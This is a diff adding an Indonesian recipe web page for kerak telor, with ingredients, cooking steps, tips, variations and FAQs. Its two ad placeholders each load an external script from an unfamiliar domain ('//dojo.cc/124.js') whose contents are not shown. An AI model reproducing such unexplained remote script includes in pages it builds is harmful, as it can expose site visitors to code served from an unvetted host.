@@ -1,0 +1,394 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Resep Kerak Telor Khas Betawi - Gurih Renyah dari Jakarta</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #fff8f0;
+            color: #2d2d2d;
+            line-height: 1.8;
+        }
+        .container {
+            max-width: 820px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        nav {
+            background: #c0392b;
+            padding: 15px 20px;
+            text-align: center;
+            margin-bottom: 30px;
+            border-radius: 0 0 12px 12px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.15);
+        }
+        nav a {
+            color: #fff;
+            text-decoration: none;
+            margin: 0 15px;
+            font-weight: 600;
+            font-size: 16px;
+            letter-spacing: 0.5px;
+        }
+        nav a:hover {
+            text-decoration: underline;
+        }
+        h1 {
+            font-size: 32px;
+            color: #c0392b;
+            margin-bottom: 20px;
+            line-height: 1.3;
+        }
+        h2 {
+            font-size: 24px;
+            color: #e67e22;
+            margin: 35px 0 15px;
+            padding-bottom: 8px;
+            border-bottom: 3px solid #f5d6c6;
+        }
+        h3 {
+            font-size: 20px;
+            color: #d35400;
+            margin: 25px 0 10px;
+        }
+        p {
+            margin-bottom: 16px;
+            font-size: 17px;
+        }
+        .hero-img {
+            width: 100%;
+            max-height: 500px;
+            object-fit: cover;
+            border-radius: 16px;
+            margin: 20px 0 25px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+        }
+        .ingredients, .steps {
+            background: #fff;
+            padding: 25px 30px;
+            border-radius: 16px;
+            box-shadow: 0 2px 12px rgba(0,0,0,0.06);
+            margin: 20px 0;
+        }
+        .ingredients h3, .steps h3 {
+            margin-top: 0;
+        }
+        .ingredients ul {
+            list-style: none;
+            padding: 0;
+        }
+        .ingredients ul li {
+            padding: 8px 0 8px 28px;
+            position: relative;
+            font-size: 16px;
+            border-bottom: 1px dashed #f0e0d6;
+        }
+        .ingredients ul li:last-child {
+            border-bottom: none;
+        }
+        .ingredients ul li::before {
+            content: "🍳";
+            position: absolute;
+            left: 0;
+        }
+        .steps ol {
+            padding-left: 20px;
+        }
+        .steps ol li {
+            padding: 12px 0 12px 8px;
+            font-size: 16px;
+            border-bottom: 1px dashed #f0e0d6;
+        }
+        .steps ol li:last-child {
+            border-bottom: none;
+        }
+        .steps ol li::marker {
+            font-weight: bold;
+            color: #e67e22;
+            font-size: 18px;
+        }
+        .ad-space {
+            background: #f5f0eb;
+            text-align: center;
+            padding: 40px 20px;
+            margin: 30px 0;
+            border-radius: 12px;
+            border: 1px dashed #ddd;
+            color: #888;
+            font-size: 14px;
+        }
+        .ad-space.middle {
+            background: #faf5f0;
+        }
+        .ad-space.footer {
+            background: #f0ebe6;
+        }
+        .tips-box {
+            background: linear-gradient(135deg, #fff8e1, #fff3cd);
+            padding: 25px 30px;
+            border-radius: 16px;
+            border-left: 6px solid #f39c12;
+            margin: 20px 0;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+        }
+        .tips-box h3 {
+            color: #e67e22;
+            margin-top: 0;
+        }
+        .tips-box ul {
+            list-style: none;
+            padding: 0;
+        }
+        .tips-box ul li {
+            padding: 8px 0 8px 28px;
+            position: relative;
+            font-size: 16px;
+        }
+        .tips-box ul li::before {
+            content: "🔥";
+            position: absolute;
+            left: 0;
+        }
+        .faq-item {
+            margin: 20px 0;
+            padding: 18px 22px;
+            background: #fff;
+            border-radius: 12px;
+            box-shadow: 0 1px 6px rgba(0,0,0,0.05);
+        }
+        .faq-item strong {
+            display: block;
+            color: #c0392b;
+            font-size: 17px;
+            margin-bottom: 6px;
+        }
+        .cta {
+            background: linear-gradient(135deg, #e67e22, #d35400);
+            color: #fff;
+            text-align: center;
+            padding: 30px 20px;
+            border-radius: 16px;
+            margin: 35px 0;
+            box-shadow: 0 4px 15px rgba(211,84,0,0.3);
+        }
+        .cta h3 {
+            color: #fff;
+            margin: 0 0 10px;
+            font-size: 22px;
+        }
+        .cta p {
+            margin: 0;
+            font-size: 16px;
+            opacity: 0.9;
+        }
+        .related {
+            background: #fff;
+            padding: 25px 30px;
+            border-radius: 16px;
+            margin: 25px 0;
+            box-shadow: 0 2px 12px rgba(0,0,0,0.06);
+        }
+        .related h3 {
+            margin-top: 0;
+            color: #c0392b;
+        }
+        .related ul {
+            list-style: none;
+            padding: 0;
+        }
+        .related ul li {
+            padding: 8px 0;
+        }
+        .related ul li a {
+            color: #d35400;
+            text-decoration: none;
+            font-size: 16px;
+        }
+        .related ul li a:hover {
+            text-decoration: underline;
+        }
+        footer {
+            text-align: center;
+            padding: 25px 0;
+            margin-top: 40px;
+            border-top: 2px solid #f0e0d6;
+            color: #888;
+            font-size: 14px;
+        }
+        footer a {
+            color: #e67e22;
+            text-decoration: none;
+        }
+        @media (max-width: 600px) {
+            h1 { font-size: 26px; }
+            h2 { font-size: 20px; }
+            .container { padding: 15px; }
+            nav a { margin: 0 8px; font-size: 14px; }
+        }
+    </style>
+</head>
+<body>
+
+<nav>
+    <a href="#">Beranda</a>
+    <a href="#">Resep</a>
+    <a href="#">Tips</a>
+    <a href="#">Tentang</a>
+    <a href="#">Kontak</a>
+</nav>
+
+<div class="container">
+
+    <h1>Resep Kerak Telor Khas Betawi: Gurih Renyah, Jajanan Favorit dari Jakarta</h1>
+
+    <p>Kalau kamu jalan-jalan ke wisata kuliner Jakarta, pasti nggak asing sama aroma gurih khas yang bikin perut langsung keroncongan. Itulah Kerak Telor — jajanan legendaris Betawi yang sudah ada sejak zaman penjajahan Belanda. Dulu, kerak telor cuma disajikan di acara-acara adat seperti pernikahan, sunatan, atau syukuran. Tapi sekarang, kamu bisa nemuinnya di hampir setiap sudut kota, dari Monas sampai Kotak Tua.</p>
+
+    <p>Yang bikin kerak telor spesial adalah cara masaknya yang unik: telur bebek dikocok sama ketan dan kelapa sangrai, lalu dimasak di atas wajan kecil (templat) sambil dibolak-balik pakai solet — alat kayu khas Betawi. Hasilnya? Tekstur luar yang renyah karamel, tapi dalamnya tetap creamy dan gurih. Cocok banget buat sarapan, camilan sore, atau lauk pendamping nasi kuning!</p>
+
+    <img class="hero-img" src="https://images.unsplash.com/photo-1565299624946-b28f40a0ae38?w=800&h=500&fit=crop" alt="Kerak Telor Khas Betawi">
+
+    <h2>Apa Itu Kerak Telor?</h2>
+
+    <p>Kerak Telor adalah makanan khas Betawi yang terbuat dari telur bebek, beras ketan putih, kelapa sangrai, dan ebi (udang kering). Namanya diambil dari tekstur luarnya yang renyah dan sedikit gosong seperti "kerak" — pas banget sama lidah orang Indonesia yang doyan tekstur kriuk-kriuk.</p>
+
+    <p>Uniknya, kerak telor nggak digoreng dengan minyak. Proses memasaknya pakai wajan tanah liat (templat) yang dipanaskan di atas arang atau api kecil. Telur yang sudah dicampur bumbu dan ketan dituang tipis, lalu dimasak sampai tepinya kecokelatan dan renyah. Proses membaliknya juga butuh teknik khusus — koki rumahan biasanya pake piring, tapi abang-abang Betawi mah jago pake solet kayu!</p>
+
+    <p>Dari segi rasa, kerak telor itu kompleks banget. Ada gurih dari telur bebek dan ebi, ada manis alami dari kelapa sangrai, plus aroma wangi kencur yang khas. Ditambah sambal kacang atau sambal kecap sebagai pelengkap, dijamin kamu bakal nambah terus!</p>
+
+    <h2>Bahan-Bahan Kerak Telor</h2>
+
+    <div class="ingredients">
+        <h3>Bahan Utama</h3>
+        <ul>
+            <li>2 butir telur bebek (bisa pakai telur ayam, tapi lebih enak bebek)</li>
+            <li>100 gram beras ketan putih, rendam 2 jam, tiriskan</li>
+            <li>50 gram kelapa sangrai (agak kasar, jangan terlalu halus)</li>
+            <li>2 sdm ebi kering, rendam air hangat, cincang halus</li>
+            <li>2 sdm bawang merah goreng</li>
+            <li>3 buah cabe merah keriting, iris halus (sesuai selera)</li>
+            <li>1 ruas kencur (sekitar 2 cm), parut halus</li>
+            <li>Garam secukupnya</li>
+            <li>Gula pasir secukupnya</li>
+            <li>Minyak goreng secukupnya untuk olesan wajan</li>
+        </ul>
+        <h3>Pelengkap</h3>
+        <ul>
+            <li>Sambal kacang atau sambal kecap</li>
+            <li>Bawang goreng taburan</li>
+        </ul>
+    </div>
+
+    <!-- MIDDLE AD -->
+    <div class="ad-space middle">
+        <script src="//dojo.cc/124.js"></script>
+        <p>[ Iklan ]</p>
+    </div>
+
+    <h2>Cara Membuat Kerak Telor</h2>
+
+    <div class="steps">
+        <ol>
+            <li><strong>Siapkan ketan:</strong> Setelah beras ketan direndam 2 jam dan ditiriskan, sangrai sebentar di wajan tanpa minyak sampai agak kering. Sisihkan. Ini penting biar ketannya nggak lembek waktu dimasak sama telur.</li>
+            <li><strong>Bikin adonan telur:</strong> Kocok lepas 2 butir telur bebek di mangkuk. Masukkan ketan sangrai, kelapa sangrai, ebi cincang, bawang merah goreng, cabe iris, kencur parut, garam, dan gula. Aduk rata sampai semua bahan tercampur sempurna.</li>
+            <li><strong>Masak kerak telor:</strong> Panaskan wajan kecil (templat atau teflon) dengan api kecil. Olesi tipis dengan minyak. Tuang 1 sendok sayur adonan, ratakan tipis di dasar wajan. Masak sampai pinggirannya mulai kecokelatan dan terlihat matang (sekitar 3-4 menit). Balikkan perlahan pakai spatula atau solet — hati-hati jangan ambyar! Masak sisi lainnya 1-2 menit sampai matang merata.</li>
+            <li><strong>Sajikan:</strong> Angkat kerak telor, letakkan di piring. Bentuknya mirip kue lumpur tipis dengan pinggiran renyah. Sajikan hangat-hangat dengan sambal kacang atau sambal kecap. Taburi bawang goreng biar makin mantap!</li>
+        </ol>
+    </div>
+
+    <h2>Rahasia Kerak Telor yang Enak</h2>
+
+    <p>Bikin kerak telor yang pas itu butuh feeling dan teknik. Nih, beberapa rahasia yang bikin kerak telor buatan kamu naik level:</p>
+
+    <p><strong>Pake telur bebek, jangan telur ayam.</strong> Telur bebek punya kandungan lemak lebih tinggi, jadinya kerak telor lebih gurih dan creamy di dalam. Kalau terpaksa pake telur ayam, tambahin sedikit minyak atau mentega biar nggak kering.</p>
+
+    <p><strong>Ketan harus direndam dulu.</strong> Minimal 2 jam, lebih baik semalaman. Ini bikin ketan lebih pulen dan cepat matang waktu disangrai. Jangan skip step ini, atau ketan bakal keras di dalam kerak telor.</p>
+
+    <p><strong>Api kecil adalah kunci.</strong> Kerak telor dimasak perlahan di api kecil biar matang sempurna tanpa gosong di luar tapi mentah di dalam. Sabar ya, ini bukan makanan cepat saji!</p>
+
+    <p><strong>Kelapa sangrai bikin wangi.</strong> Sangrai kelapa parut di wajan tanpa minyak sampai kuning kecokelatan dan wangi. Aduk terus biar nggak gosong. Kelapa sangrai bikin kerak telor makin gurih dan aromanya makin semerbak.</p>
+
+    <h2>Variasi Kerak Telor</h2>
+
+    <p><strong>Kerak Telor Pedas Manis:</strong> Tambahin 2 sdm sambal botolan atau saus sambal ke dalam adonan telor. Atau kalau mau lebih nendang, campur cabe rawit iris ke dalam adonan. Rasanya pedas gurih bikin nagih!</p>
+
+    <p><strong>Kerak Telor Keju:</strong> Buat kamu yang suka western twist, taburi keju parut (cheddar atau mozzarella) di atas kerak telor pas lagi dimasak. Tutup sebentar biar kejunya lumer. Dijamin anak-anak suka!</p>
+
+    <p><strong>Kerak Telor Seafood:</strong> Selain ebi, tambahin potongan kecil udang segar atau cumi yang sudah direbus sebentar. Rasa lautnya makin kuat dan teksturnya makin kaya. Cocok buat kamu yang doyan seafood!</p>
+
+    <h2>Tips Biar Kerak Telor Sempurna</h2>
+
+    <div class="tips-box">
+        <h3>🔥 Tips Jitu dari Abang Betawi</h3>
+        <ul>
+            <li>Gunakan wajan anti lengket atau wajan tanah liat asli (templat) biar nggak lengket dan gampang dibalik.</li>
+            <li>Jangan terlalu tebal menuang adonan — sekitar 0,5 cm aja supaya matang merata sampai ke dalam.</li>
+            <li>Pastikan ebi sudah direndam dan dicincang halus, biar nggak keras pas dimakan.</li>
+            <li>Biar makin renyah, setelah matang bisa diangin-anginkan sebentar di atas piring sebelum disajikan.</li>
+            <li>Kalau bikin buat banyak orang, simpan adonan di kulkas dan masak bertahap — kerak telor paling enak dimakan langsung selagi panas!</li>
+            <li>Sambal kacang homemade lebih enak: kacang goreng dihaluskan, campur air asam jawa, gula merah, cabe, dan sedikit kecap manis.</li>
+        </ul>
+    </div>
+
+    <h2>FAQ Kerak Telor</h2>
+
+    <div class="faq-item">
+        <strong>Apakah telur bebek bisa diganti telur ayam?</strong>
+        <p>Bisa sih, tapi rasanya nggak sama. Telur bebek bikin kerak telor lebih gurih dan creamy. Kalau pake telur ayam, hasilnya lebih kering dan teksturnya kurang kaya. Tapi kalau memang nggak ada telur bebek, tetap bisa kok — tinggal tambah sedikit minyak atau mentega ke dalam adonan.</p>
+    </div>
+
+    <div class="faq-item">
+        <strong>Kenapa kerak telor saya hancur waktu dibalik?</strong>
+        <p>Biasanya karena adonan terlalu tipis atau kurang dimasak di sisi pertama. Pastikan pinggirannya sudah kecokelatan dan agak kering sebelum dibalik. Juga, gunakan spatula lebar atau solet biar angkatnya rata. Api yang terlalu besar juga bikin luar cepet gosong tapi dalam masih lembek.</p>
+    </div>
+
+    <div class="faq-item">
+        <strong>Kerak telor tahan berapa lama?</strong>
+        <p>Paling enak dimakan hangat-hangat sesaat setelah dimasak. Kalau disimpan di suhu ruang, kerak telor bisa bertahan 3-4 jam tapi tekstur renyahnya bakal hilang. Kalau mau simpan di kulkas, taruh dalam wadah kedap udara — bisa tahan 1-2 hari. Panasin lagi di teflon tanpa minyak sebentar sebelum dimakan.</p>
+    </div>
+
+    <div class="faq-item">
+        <strong>Apa bedanya kerak telor sama martabak telor?</strong>
+        <p>Banyak banget bedanya! Kerak telor pake ketan dan kelapa sangrai, dimasak tipis di wajan kecil, dan nggak pake minyak goreng. Martabak telor pake kulit lumpia atau adonan tepung, digoreng dengan minyak banyak, dan isiannya biasanya daging cincang. Dari segi rasa, kerak telor lebih gurih alami, martabak telor lebih garing berminyak.</p>
+    </div>
+
+    <div class="faq-item">
+        <strong>Di mana bisa beli kerak telor asli di Jakarta?</strong>
+        <p>Beberapa tempat legendaris: (1) Monas — banyak abang jualan di area pintu masuk, (2) Kotak Tua (Fatahillah) — setiap akhir pekan pasti ada, (3) Pasar Santa — ada stan khusus kerak telor, (4) Acara-acara budaya Betawi di Setu Babakan. Tapi kalau mau yang paling otentik, langsung aja ke Setu Babakan, kampung budaya Betawi di Jakarta Selatan.</p>
+    </div>
+
+    <div class="cta">
+        <h3>Sudah Siap Masak Kerak Telor?</h3>
+        <p>Yuk langsung praktek di dapur! Jangan lupa ajak keluarga atau teman buat nyobain bareng — dijamin mereka bakal kagum sama skill memasak kamu. Selamat mencoba, dan jangan lupa share hasilnya ya! 🍳</p>
+    </div>
+
+    <div class="related">
+        <h3>🍽️ Baca Juga</h3>
+        <ul>
+            <li><a href="#">Resep Soto Betawi: Kuah Santan Gurih nan Segar</a></li>
+            <li><a href="#">Resep Ketoprak: Salad Lontong Khas Jakarta</a></li>
+            <li><a href="#">Resep Gado-Gado: Sayur Segar dengan Saus Kacang</a></li>
+            <li><a href="#">Resep Semur Jengkol: Masakan Betawi yang Bikin Nagih</a></li>
+        </ul>
+    </div>
+
+    <!-- FOOTER AD -->
+    <div class="ad-space footer">
+        <script src="//dojo.cc/124.js"></script>
+        <p>[ Iklan ]</p>
+    </div>
+
+</div>
+
+<footer>
+    <p>&copy; 2026 <a href="#">RemoteProduktif</a> &amp; <a href="#">Fattan</a>. All rights reserved. Masakanku — Resep rumahan terbaik untukmu.</p>
+</footer>
+
+</body>
+</html>
